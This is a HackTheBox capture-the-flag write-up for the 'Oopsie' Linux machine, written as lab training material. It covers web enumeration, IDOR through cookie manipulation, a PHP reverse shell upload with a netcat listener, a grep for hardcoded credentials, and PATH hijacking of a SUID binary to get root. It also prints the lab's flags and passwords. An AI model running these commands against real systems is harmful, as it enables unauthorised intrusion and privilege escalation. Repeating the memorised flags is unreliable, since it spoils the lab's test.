# Oopsie — HackTheBox (Starting Point Tier 2)

## Info

| Field      | Details                              |
|------------|--------------------------------------|
| Platform   | HackTheBox                           |
| Difficulty | Easy                                 |
| OS         | Linux (Ubuntu 18.04)                 |
| Topics     | Web Enumeration, IDOR, Cookie Manipulation, File Upload, PATH Hijacking, SUID |

---

## Summary

Oopsie is a Linux web application machine. Initial access is gained by discovering a hidden login panel through source code analysis, exploiting an IDOR vulnerability via cookie manipulation to gain admin access, and uploading a PHP reverse shell. Privilege escalation is achieved by finding credentials in a PHP config file, then exploiting a SUID binary that calls `cat` without a full path — allowing PATH hijacking to get a root shell.

---

## Reconnaissance

### Full Port Scan

```
nmap -sS -p- -T4 <target-ip>
```

**Open ports:** 22 (SSH), 80 (HTTP)

### Service Detection

```
nmap -sV -sC -p 22,80 <target-ip>
```

Key findings:

- **Port 22** — OpenSSH 7.6p1 Ubuntu
- **Port 80** — Apache 2.4.29, title "Welcome"

Only two ports open — the attack surface is entirely web-based.

---

## Web Enumeration

### Directory Discovery

```
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt -x php
```

Found directories: `/uploads`, `/images`, `/css`, `/js`, `/themes`

No login page found via gobuster. The next step is manual source code analysis.

### Source Code Analysis

Viewing the page source (`Ctrl+U`) reveals a hidden script reference:

```html
<script src="/cdn-cgi/login/script.js"></script>
```

Navigating to `http://<target-ip>/cdn-cgi/login/` reveals a login panel — not discoverable through standard directory enumeration because the path uses a non-standard structure.

The main page also leaks the admin email: `admin@megacorp.com`, suggesting the username is `admin`.

---

## Initial Access

### Guest Login and Cookie Analysis

The login page includes a "Login as Guest" option. After logging in as guest, inspecting the cookies via Developer Tools (F12 → Application → Cookies) reveals:

- `role` = `guest`
- `user` = `2233`

The application uses client-side cookies to control access — a critical misconfiguration.

### IDOR via Cookie Manipulation

Navigating to the Accounts section while logged in as guest:

```
http://<target-ip>/cdn-cgi/login/admin.php?content=accounts&id=1
```

This reveals the admin account details:

| Access ID | Name  | Email               |
|-----------|-------|---------------------|
| 34322     | admin | admin@megacorp.com  |

This is an **IDOR (Insecure Direct Object Reference)** vulnerability — user IDs are exposed and can be accessed without authorization.

Modifying the cookies in the browser:
- `role` → `admin`
- `user` → `34322`

After refreshing, admin access is granted including access to the Uploads section.

### PHP Reverse Shell Upload

Preparing the payload on the attack machine:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ~/shell.php
nano ~/shell.php
# Set $ip to tun0 IP and $port to 4444
```

The shell is uploaded through the Uploads panel. Setting up a listener:

```bash
nc -lvnp 4444
```

Navigating to `http://<target-ip>/uploads/shell.php` triggers the shell:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrading to a proper shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### User Flag

```bash
cat /home/robert/user.txt
f2c74ee8db7983851ab2a96a44eb7981
```

---

## Privilege Escalation

### Finding Credentials in Source Files

Searching for PHP files containing passwords:

```bash
find /var/www -name "*.php" | xargs grep -l "password" 2>/dev/null
```

Result: `/var/www/html/cdn-cgi/login/db.php`

Reading the file:

```bash
cat /var/www/html/cdn-cgi/login/db.php
```

```php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
```

Database credentials for robert are hardcoded in plaintext.

### Lateral Movement to Robert

```bash
su robert
# Password: M3g4C0rpUs3r!
```

Checking robert's groups:

```bash
id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

Robert belongs to a non-standard group: **bugtracker**.

### SUID Binary Discovery

Finding files owned by the bugtracker group:

```bash
find / -group bugtracker 2>/dev/null
```

Result: `/usr/bin/bugtracker`

Checking permissions:

```bash
ls -la /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25 2020 /usr/bin/bugtracker
```

The `s` in the permissions indicates a **SUID bit** — the binary runs as **root** regardless of who executes it.

### PATH Hijacking

Running the binary and providing a bug ID returns report content from `/root/reports/`. Analyzing the binary with `strings`:

```bash
strings /usr/bin/bugtracker
```

Key finding:

```
cat /root/reports/
```

The binary calls `cat` without a full path (`/bin/cat`). This means it relies on the `$PATH` environment variable to find `cat` — making it vulnerable to PATH hijacking.

Creating a malicious `cat` in `/tmp`:

```bash
cd /tmp
echo '/bin/bash' > cat
chmod +x cat
export PATH=/tmp:$PATH
```

Running the bugtracker binary with any Bug ID:

```bash
/usr/bin/bugtracker
# Provide Bug ID: 1
```

The binary finds our fake `cat` first in `/tmp`, executes it as root, and spawns a root shell:

```
root@oopsie:/tmp#
```

### Root Flag

```bash
/bin/cat /root/root.txt
af13b0bee69f8a877c3faf667f7beacf
```

Note: The built-in `cat` command is our fake shell, so `/bin/cat` must be used explicitly to read files.

---

## What Failed / Dead Ends

- Standard directory enumeration did not find the login panel — it required manual source code analysis to discover the `/cdn-cgi/login/` path.
- The admin password `MEGACORP_4dm1n!!` found in `index.php` did not work for the robert user — credentials are not always reused between accounts.
- After PATH hijacking, the `cat` command was our fake shell — using `cat` to read the root flag returned nothing. Full path `/bin/cat` was required.

---

## Key Takeaways

- Always read the page source manually — gobuster misses paths that are referenced in JavaScript or HTML comments.
- Client-side cookies that control access roles are a critical vulnerability — never trust the client to enforce authorization.
- IDOR vulnerabilities allow accessing other users' data by manipulating object references (user IDs, account numbers) in requests.
- Database credentials hardcoded in PHP config files are a common finding in web application pentests.
- SUID binaries that call system commands without full paths are vulnerable to PATH hijacking — the same technique used in Steel Mountain.
- After PATH hijacking, any command that was hijacked must be called with its full path to work normally.
